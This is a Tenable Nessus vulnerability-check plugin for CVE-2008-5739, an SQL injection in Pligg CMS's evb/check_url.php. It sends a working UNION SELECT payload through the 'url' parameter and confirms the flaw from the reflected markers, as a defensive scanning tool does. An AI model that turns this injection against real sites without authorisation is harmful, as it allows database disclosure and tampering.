#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(35262);
  script_version("$Revision: 1.17 $");
  script_cvs_date("$Date: 2016/05/20 14:30:35 $");

  script_cve_id("CVE-2008-5739");
  script_bugtraq_id(32970);
  script_osvdb_id(50913);
  script_xref(name:"EDB-ID", value:"7544");

  script_name(english:"Pligg evb/check_url.php url Parameter SQL Injection");
  script_summary(english:"Tries to manipulate link output from evb/check_url.php");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to a SQL
injection attack.");
  script_set_attribute(attribute:"description", value:
"The remote host is running Pligg, an open source content management
system. 

The installed version of Pligg fails to sanitize user-supplied input
to the 'url' parameter of the 'evb/check_url.php' script before using
it to construct database queries.  Provided PHP's 'magic_quotes_gpc'
setting is disabled, an unauthenticated attacker may be able to
exploit this issue to manipulate database queries, leading to
disclosure of sensitive information, modification of data, or attacks
against the underlying database.");
  script_set_attribute(attribute:"solution", value:"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(89);

  script_set_attribute(attribute:"plugin_publication_date", value:"2008/12/23");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:pligg:pligg_cms");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


magic1 = unixtime();
magic2 = rand();


# Loop through various directories.
if (thorough_tests) dirs = list_uniq("/pligg", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit the issue to manipulate the EVB output.
  exploit = string(SCRIPT_NAME, "' UNION SELECT ", magic1, ",", magic2, " -- ");
  url = string(dir, "/evb/check_url.php?url=", exploit);
  url = str_replace(find:" ", replace:"%20", string:url);

  req = http_mk_get_req(port:port, item:url);
  res = http_send_recv_req(port:port, req:req);
  if (isnull(res)) exit(0);

  # There's a problem if we could manipulate the output.
  if (string('story.php?id=', magic1, '" title="', magic2, ' votes') >< res[2])
  {
    if (report_verbosity > 0)
    {
      req_str = http_mk_buffer_from_req(req:req);
      report = string(
        "\n",
        "Nessus was able to verify the vulnerability exists using the following\n",
        "request :\n",
        "\n",
        "  ", build_url(port:port, qs:url), "\n"
      );
      security_warning(port:port, extra:report);
    }
    else security_warning(port);

    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    exit(0);
  }
}
